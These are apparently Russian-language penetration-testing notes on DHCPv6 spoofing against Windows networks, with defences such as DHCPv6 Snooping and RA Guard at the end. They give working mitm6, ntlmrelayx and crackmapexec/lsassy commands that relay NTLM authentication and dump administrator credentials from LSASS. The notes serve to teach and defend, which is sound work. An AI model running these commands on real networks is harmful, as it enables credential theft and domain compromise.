> Цель - заставить жертву совершить NTLM аутентификацию на наш поддельный сервер, чтобы мы потом могли ее зарелееть (ретранслировать) на реальный сервер

### Получение адреса DNS-сервера через IPv6
1) Вручную
2) Через сообщения роутера RA (Router Advertisment)
3) Stateless DHCPv6 - другая инфа с DHCPv6 сервера 
4) Stateful DHCPv6 - вся инфа с DHCPv6 сервера 

> В Windows IPv6 пользуется большим приоритетом, чем IPv4, поэтому при получении IPv6 машина начнет его резолвить, поэтому если мы его подменим, то все запросы будут проходить через нас

Используем технику **Stateful DHCPv6**, где через DHCP сервер хост получает всю информацию о конфигурации

### Проведение атаки через **Stateful DHCPv6**

1) Атакующий шлет Router Advertisment запрос, в котором говорит, что он DHCP сервер
2) Жертва отправляет Soliciе DHCP запрос
3) На него отвечает атакер и говорит принимать данную сетевую конфигурацию

-----
1) Поднимаем подложный DHCP сервер, сразу отправляется RA пакеты, из-за того что windows периодически шлет Solicit запросы, то жертва сразу получает подложный IPv6 для DHCP сервера
```bash
sudo mitm6 -i eth0
```

2)  Включаем перехват NTLM хэшей аутентификации и релеем ее на реальный рабочий сервер
```bash
sudo impacket-ntlmrelayx -smb2support -6 -t {real_server}
```


3) Взлом хэша локального администратора, если на сервер вошел администратор домена, то можно из памяти процесса lsassy вытащить его учетку
```bash
sudo crackmapexec smb {real_server} -u administrator -H {NTLM_hash} --local-auth -M lsassy
```
## Защита от атаки DHCPv6 Spoofing/Rogue RA

> **Отключение IPv6, если он не используется**
> RA Guard
> DHCPv6 Snooping

### DHCPv6 Snooping (DHCPv6 Guard)
1) У коммутатора указываются какие порты Trusted, а какие Untrusted
2) Untrusted - endpoints
3) Trusted - порты к другому коммутатору или к доверенному DHCPv6 server
4) На Untrusted Reply и Advertisment будут отбрасываться
5) На Trusted трафик DHCPv6 будет пропускаться

### RA Guard
Настраивается через политики IPv6 на коммутаторе
1) Запросы RA с реального роутера проходят, потому что его VLAN помечен как ROUTER
2) Подложные запросы RA атакера блокируются, потому что его VLAN идентифицируется как HOST, соответсвенно атака блокируется
